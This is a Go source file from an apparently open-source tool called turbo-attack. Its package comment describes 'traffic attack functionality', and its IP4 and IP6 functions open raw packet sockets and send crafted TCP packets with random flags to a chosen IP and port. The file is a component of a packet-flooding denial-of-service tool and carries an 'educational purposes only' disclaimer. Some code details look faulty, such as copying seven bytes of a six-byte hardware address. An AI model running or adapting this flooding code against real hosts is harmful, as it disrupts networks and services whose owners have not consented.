// Terms Of Use
// ------------
// Do NOT use this on any computer you do not own or are not allowed to run this on.
// You may NEVER attempt to sell this, it is free and open source.
// The authors and publishers assume no responsibility.
// For educational purposes only.

// Package routine provides traffic attack functionality to a particular ip and port.
package routine

import (
	"errors"
	"net"
	"syscall"

	"github.com/mytechnotalent/turbo-attack/packet"
)

// IP4 takes an ip and port and sends a random TCP4 packet with random flags.
// It returns an error if one occurred.
func IP4(ethInterface *string, ip4Byte *[]byte, portByte *[]byte) error {
	fd, _ := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, syscall.ETH_P_ALL)
	nic, err := net.InterfaceByName(*ethInterface)
	if err != nil {
		return errors.New("interface does not exist")
	}
	var hardwareAddr [8]byte
	copy(hardwareAddr[0:7], nic.HardwareAddr[0:7])
	addr := syscall.SockaddrLinklayer{
		Protocol: syscall.ETH_P_IP,
		Ifindex:  nic.Index,
		Halen:    uint8(len(nic.HardwareAddr)),
		Addr:     hardwareAddr,
	}
	_ = syscall.Bind(fd, &addr)
	packet, err := packet.TCP4(74, *ip4Byte, *portByte)
	_, _ = syscall.Write(fd, packet)
	syscall.Close(fd)
	return nil
}

// IP6 takes an ip and port and sends a random TCP6 packet with random flags.
// It returns an error if one occurred.
func IP6(ethInterface *string, ip6Byte *[]byte, portByte *[]byte) error {
	fd, _ := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, syscall.ETH_P_ALL)
	nic, err := net.InterfaceByName(*ethInterface)
	if err != nil {
		return errors.New("interface does not exist")
	}
	var hardwareAddr [8]byte
	copy(hardwareAddr[0:7], nic.HardwareAddr[0:7])
	addr := syscall.SockaddrLinklayer{
		Protocol: syscall.ETH_P_IP,
		Ifindex:  nic.Index,
		Halen:    uint8(len(nic.HardwareAddr)),
		Addr:     hardwareAddr,
	}
	_ = syscall.Bind(fd, &addr)
	packet, err := packet.TCP6(74, *ip6Byte, *portByte)
	_, _ = syscall.Write(fd, packet)
	syscall.Close(fd)
	return nil
}
